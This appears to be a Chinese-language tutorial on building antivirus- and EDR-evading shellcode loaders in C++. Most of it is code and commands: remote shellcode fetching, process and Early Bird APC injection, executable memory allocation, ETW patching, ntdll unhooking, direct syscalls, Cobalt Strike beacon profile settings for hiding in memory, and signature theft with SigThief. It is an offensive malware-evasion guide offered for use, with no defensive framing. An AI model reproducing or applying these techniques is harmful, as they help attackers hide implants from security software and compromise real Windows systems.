# C++免杀

#### 获取

##### 一 本地

将shellcode写在文件里

```c
char buf[] = "";
```

##### 二 远程

利用wininet远程加载shellcode

```c
HINTERNET hinternet = InternetOpen(L"myapp", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
HINTERNET hConnect = InternetOpenUrlA(hinternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0); //创建链接

DWORD readbytes;
InternetReadFile(hConnect, buf, sc_len, &readbytes);	//读
```

使用wininet库时

```c
#include<wininet.h>
#pragma comment(lib, "wininet.lib")
```

#### 运行

##### 一 内联汇编加载

```c
__asm {
	lea eax, buf	//buf处为shellcode
	call eax
}
```

vs不支持x64内联汇编，64位程序使用Intel编译器

##### 二 函数指针加载

```c
((void(*)(void)) buf)();
```

##### 三 通过线程启动

```c
CreateThread(NULL, 0, Memory, NULL, 0, NULL);
WaitForSingleObject(hThread, INFINITE); 	//等待线程创建
```

##### 四 线程注入

在另一进程中创建线程启动

```
HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpMapAddressRemote, NULL, 0, NULL);
```

##### 五 APC注入

APC（异步过程调用）， APC是一个链状的数据结构，可以让一个线程在其本应该的执行步骤前执行其他代码，每个线程都维护这一个APC链。当线程从等待状态苏醒后，会自动检测自己得APC队列中是否存在APC过程。

Early Bird本质上是一种APC注入与线程劫持的变体，由于线程初始化时会调用ntdll未导出函数 NtTestAlert，NtTestAlert是一个检查当前线程的 APC 队列的函数，如果有任何排队作业，它会清空队列。当线程启动时，NtTestAlert会在执行任何操作之前被调用。

* 创建一个挂起的进程
* 申请RWX shellcode内存空间
* 将APC插入到该进程的主线程
* 恢复挂起进程的线程

```
// 创建新的进程
LPCSTR lpApplication = "C:\\Program Files\\Notepad++\\notepad++.exe";
STARTUPINFOA sInfo = { 0 };
PROCESS_INFORMATION pInfo = { 0 };

CreateProcessA(lpApplication, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sInfo, &pInfo);
HANDLE hProc = pInfo.hProcess;
HANDLE hThread = pInfo.hThread;

//分配并写入shellcode
LPVOID lpvShellAddress = VirtualAllocEx(hProc, NULL, sc_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
PTHREAD_START_ROUTINE ptApcRoutine = (PTHREAD_START_ROUTINE)lpvShellAddress;
WriteProcessMemory(hProc, lpvShellAddress, shellcode, sc_len, NULL);

pNtTestAlert NtTestAlert = (pNtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));

// APC注入
QueueUserAPC((PAPCFUNC)ptApcRoutine, hThread, NULL);
ResumeThread(hThread);		//通过恢复线程执行APC过程
NtTestAlert();			//通过直接调用NtTestAlert执行APC过程
```

还有其他方式执行APC过程，如创建debug进程，调用DebugActiveProcessStop来执行APC过程

```
...
CreateProcessA(lpApplication, NULL, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &sInfo, &pInfo);
...
QueueUserAPC((PAPCFUNC)ptApcRoutine, hThread, NULL);
DebugActiveProcessStop(PId);
```

#### 分配内存

运行shellcode需要一块可读可执行的内存空间

##### 一 VirtualAlloc直接分配

```c
VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```

##### 二 VirtualProtect

创建数组变量后VirtualProtect改变内存空间属性

```c
int flOldProtect[11];
VirtualProtect(Memory, sizeof(buf), PAGE_EXECUTE_READ, flOldProtect);
```

##### 三 分配可执行权限的堆

```c
HANDLE HeapHandle = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, sizeof(buf), 0);
char* heap_buf = (char*)HeapAlloc(HeapHandle, HEAP_ZERO_MEMORY, sizeof(buf));
```

标准c库malloc函数分配的内存块使用VirtualProtect赋予可执行权限后依旧不可以执行代码

##### 四 在另一进程寻找空闲空间

通过for循环编译tpid获取当前所有进程来注入shellcode

```
//获取某进程程句柄，完全访问权限
HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS,FALSE,tpid);

//page_size为页大小0x1000，alloc_gran为最小分配粒度0x10000
SYSTEM_INFO sysinfo;
GetSystemInfo(&sysinfo);

SIZE_T page_size = sysinfo.dwPageSize;
SIZE_T alloc_gran = sysinfo.dwAllocationGranularity;
PBYTE beginaddr = (PBYTE)sysinfo.lpMinimumApplicationAddress;
PBYTE endaddr = (PBYTE)sysinfo.lpMaximumApplicationAddress;


// 获取合适的基址，通过VirtualQueryEx获取该进程可用的shellcode大小的空闲空间

int cneed_alloc = szRead / alloc_gran + 1;
int lchunk_need_alloc = alloc_gran / page_size;

MEMORY_BASIC_INFORMATION mbi;

PBYTE base = beginaddr;
for (base; base < endaddr; base += page_size)
{

    VirtualQueryEx(hProc, base, &mbi, sizeof(MEMORY_BASIC_INFORMATION));

    if (MEM_FREE == mbi.State) {

        uint64_t i;
        for (i = 0; i < cneed_alloc * lchunk_need_alloc; ++i) {
            LPVOID currentBase = (LPVOID)((DWORD_PTR)base + (i * page_size));

            VirtualQueryEx(hProc, currentBase, &mbi, sizeof(MEMORY_BASIC_INFORMATION));

            if (MEM_FREE != mbi.State)
                break;
        }

        if (i == cneed_alloc * lchunk_need_alloc) {
            break;
        }
    }
}
// 在base处分配rx空间，通过CreateRemoteThread启动
```

进程注入本就是一种可疑的行为，很容易被检测

##### 五 CreateFileMapping->MapViewOfFile映射

映射注入是一种内存注入技术，可以避免使用一些经典注入技术使用的API,如VirtualAllocEx,WriteProcessMemory等被杀毒软件严密监控的API，同时创建Mapping对象本质上属于申请一块物理内存，而申请的物理内存又能比较方便的通过系统函数直接映射到进程的虚拟内存里，这也就避免使用经典写入函数，增加了隐蔽性。

```
HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sc_len, NULL);
LPVOID lpMapAddress = MapViewOfFile(hMapping, FILE_MAP_WRITE|FILE_EXECUTE, 0, 0, sc_len);
memcpy((PVOID)lpMapAddress, shellcode, sc_len);
```

将shellcode以映射的方式写入通过映射分配的rx的lpMapAddress处

#### 绕过

##### 一 Sleep

通过Sleep函数躲避沙箱检测

##### 二 隐藏控制台

```c
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
```

##### 三对可疑的字符串加密

对请求外部的url，shellcode，可疑函数名称，进行加密，运行时解密来绕过静态查杀

##### 四 导入表混淆

可疑的Windows API会出现在IAT（导入地址表）中，直接调用dll中的函数绕过该检测

```c
typedef BOOL(WINAPI* pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);// 声明一个函数指针变量
pVirtualProtect fnVirtualProtect;				//fnVirtualProtect指向dll中的VirtualProtect
HMODULE mMoudle = GetModuleHandle(TEXT("kernel32.dll"));	//获得dll句柄
fnVirtualProtect = (pVirtualProtect)GetProcAddress(mMoudle, "VirtualProtect");	//获取VirtualProtect函数地址
fnVirtualProtect(mem, 0x5000, PAGE_EXECUTE_READ, flOldProtect);
```

##### 五 禁用Windows事件跟踪 (ETW)

ETW允许对一个进程的功能和WINAPI调用进行广泛的检测和追踪，许多EDR解决方案广泛利用了Windows事件追踪（ETW）。

EtwEventWrite函数的作用是写入/记录ETW事件，获取该函数在ntdll.dll中的地址，然后，将其第一条指令替换为返回0（SUCCESS）的指令来绕过ETW

```c
typedef BOOL(WINAPI* pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);

void disableETW(void) {
	// return 0
	unsigned char patch[] = { 0x48, 0x33, 0xc0, 0xc3 };     // xor rax, rax; ret

	ULONG oldprotect = 0;
	size_t size = sizeof(patch);

	HANDLE hCurrentProc = GetCurrentProcess();

	void* pEventWrite = GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "EtwEventWrite");
	pVirtualProtect fnVirtualProtect = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "VirtualProtect");


	fnVirtualProtect(pEventWrite, size, PAGE_READWRITE, &oldprotect);

	memcpy(pEventWrite, patch, size / sizeof(patch[0]));

	fnVirtualProtect(pEventWrite, size, oldprotect, &oldprotect);

	FlushInstructionCache(hCurrentProc, pEventWrite, size);
}
```

但这种直接修改内存中dll的方式很容易直接报毒

##### 六 规避常见的恶意API调用模式

EDR行为检测为检测恶意模式，比如在很短的时间范围内针对特定的WINAPI的顺序调用，例如VirtualProtect等可疑的WINAPI调用通常用于执行shellcode，有时这些API也用于良性活动，通过延迟分配以及写入shellcode来规避检测

* 与其分配一大块内存并直接将~250KB的implant shellcode写入该内存，不如分配小块但连续的内存，例如<64KB的内存，并将其标记为NO_ACCESS。然后，将shellcode按照相应的块大小写入这些内存页中。
* 在上述的每一个操作之间引入延迟。这将增加执行shellcode所需的时间，但也会淡化连续执行模式。

Filip的[DripLoader](https://github.com/xuanxuan0/DripLoader)就实现了这些概念

##### 七 去除ntdll中的hook

###### 获得未hook的dll

例如Bit Defender，是直接在ntdll.dll中hook的，可以通过获得未hook的纯净dll来绕过，例如[RefleXXion](https://github.com/hlldz/RefleXXion)

###### 直接装载dll

dll是通过完全映射装载的，可以通过读取dll文件到内存中绕过hook

例如使用CreateFileMapping->MapViewOfFile映射ntdll.dll

###### 从挂起的进程获取纯净的dll

##### 八 使用直接系统调用并规避"系统调用标记"

在调用如VirtualProtect等函数时，方式为VirtualProtect(kernel32.dll)->NtAllocateVirtualMemory(ntdll.dll)->sysycall。可以通过直接进行系统调用来绕过杀软在dll中的hook

但是直接调用系统调用有两个问题

* 二进制文件最终会用到系统调用指令，这很容易被静态检测到（对本进程使用系统调用VT极容易报毒SysWhisper，注入到其他线程检测会减弱）
* 与通过等效ntdll.dll调用的系统调用的正常用法不同，系统调用的返回地址并不指向ntdll.dll。相反，它指向我们调用系统调用的代码，该代码驻留在ntdll.dll之外的内存区域。这是没有通过ntdll.dll调用系统调用的标志，表明这里很可能有猫腻。

为了克服这些问题，我们可以：

* 使用特殊的字符串标记（一些随机的、唯一的、可识别的模式）替换syscall指令，然后在运行时，再在内存中搜索这个标记，并使用ReadProcessMemory和WriteProcessMemory等WINAPI调用将其替换为syscall指令。之后，我们可以正常使用直接系统调用了。这种技术已经由[klezVirus](https://klezvirus.github.io/RedTeaming/AV_Evasion/NoSysWhisper/)实现。
* 我们不从自己的代码中调用syscall指令，而是在ntdll.dll中搜索syscall指令，并在我们准备好调用系统调用的堆栈后跳转到该内存地址。这将导致RIP中的返回地址指向ntdll.dll内存区域。

实际上，SysWhisper3已经实现了这两种技术

##### 九 内核unhook

而像360是直接在内核hook的，

#### shellcode内存加密

##### 一 修改c2配置文件

* `sleep_mask "true";`：通过启用此选项，Cobalt Strike 将在休眠之前对其信标的堆和每个图像部分进行异或运算，从而使信标内存中不会留下任何不受保护的字符串或数据。因此，上述任何工具都不会进行检测。
* `set obfuscate "true";`：启用此功能将删除存储在信标堆中的大部分字符串，能混淆dll的导入表、区段名等信息，使得根据导入表匹配的规则失效
* `set startrwx "false";`：限制使用具有RWX标记的内存
* `set userwx "false";`：设置执行反射dll所分配的内存属性，true为RWX，false为RX
* `set stomppe "true";`：对MZ、PE和e_lfanew的值进行混淆，使根据MZ等关键字的内存匹配失效
* `set cleanup "true";`：beacon启动后清除shellcode
* 修改profile中的http-get、http-post标签中的配置，同时也可以把网上开源的profile加入检测流量规则中，如检测伪装amazing的https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/amazon.profile，这也是在流量侧的隐匿，配合域前置以达到更好的效果

配置文件还有其他可细化的地方，如通信时加密方式···

[配置C2 profile规避流量检测 - FreeBuf网络安全行业门户](https://www.freebuf.com/defense/403525.html)

[[原创]CobaltStrike检测与对抗-编程技术-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-274676.htm)

##### 二 伪造调用堆栈

1. 在Beacon休眠时将会调用Sleep函数
2. 实现MySleep，在Sleep执行前加密内存中的shellcode并设置为NO_ACCESS，Sleep执行后恢复shellcode执行权限

#### 其他隐藏

##### 一 替换图标

若使用的是Visual Studio编译器，添加ico资源文件后重新编译即可（默认vs仅支持ico文件添加，若添加png则需先转为ico文件），若替换生成的exe文件的图标，使用[resource-hacker](https://github.com/qb40/resource-hacker)

##### 二 制作文件签名

使用[SigThief](https://github.com/secretsquirrel/SigThief)伪造签名

验证签名：`python3 sigthief.py -i C:\Users\Lenovo\Desktop\sign.exe -c`

签名窃取:  `python3 sigthief.py -i "G:\Feishu\Feishu.exe" -t "C:\Users\Lenovo\Desktop\stageless.exe" -o C:\Users\Lenovo\Desktop\sign.exe`

##### 三 更换编译器及编译配置
